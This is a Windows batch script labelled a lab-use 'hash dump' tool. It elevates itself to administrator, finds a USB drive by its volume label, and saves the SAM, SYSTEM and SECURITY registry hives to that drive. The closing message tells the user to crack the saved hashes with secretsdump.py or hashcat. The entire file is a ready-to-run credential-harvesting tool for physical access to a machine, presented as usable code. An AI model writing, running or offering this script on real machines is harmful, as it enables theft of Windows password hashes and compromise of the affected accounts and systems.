@echo off
setlocal EnableDelayedExpansion
title Hash Dump Utility
color 0A

:: ===============================
:: Wsuits6 Hash Dump Tool (Lab Use Only)
:: ===============================

:: ---- Check for Administrator ----
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] Not running as administrator. Relaunching with elevated rights...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: ---- Configuration ----
set "USB_LABEL=Hsociety"
set "MAIN_FOLDER=HashDumps"

:: ---- Detect USB Drive by Label ----
for /f "tokens=1,2*" %%A in ('wmic logicaldisk get name^, volumename ^| findstr /I "%USB_LABEL%"') do (
    set "USB_DRIVE=%%A"
)

if not defined USB_DRIVE (
    echo [ERROR] USB with label "%USB_LABEL%" not found.
    pause
    exit /b
)

:: ---- Get Hostname and Timestamp ----
for /f %%C in ('hostname') do set "PC_NAME=%%C"
for /f %%D in ('wmic os get localdatetime ^| find "."') do set "DATETIME=%%D"
set "DATETIME=!DATETIME:~0,4!-!DATETIME:~4,2!-!DATETIME:~6,2!_!DATETIME:~8,2!-!DATETIME:~10,2!-!DATETIME:~12,2!"

:: ---- Create Output Directory ----
set "OUTPUT_DIR=%USB_DRIVE%\%MAIN_FOLDER%\%PC_NAME%_%DATETIME%"
mkdir "%OUTPUT_DIR%" >nul 2>&1

echo [+] Output directory created at: %OUTPUT_DIR%

:: ---- Save Registry Hives ----
echo [+] Saving SAM, SYSTEM, and SECURITY registry hives...
reg save HKLM\SAM "%OUTPUT_DIR%\SAM" >nul 2>&1
reg save HKLM\SYSTEM "%OUTPUT_DIR%\SYSTEM" >nul 2>&1
reg save HKLM\SECURITY "%OUTPUT_DIR%\SECURITY" >nul 2>&1

if %errorlevel% neq 0 (
    echo [!] Failed to save one or more registry hives. Check permissions.
) else (
    echo [+] Registry hives saved successfully.
)

:: ---- Finish ----
echo [!] Hashes are saved. You can process them later with tools like secretsdump.py or hashcat.
pause
exit /b
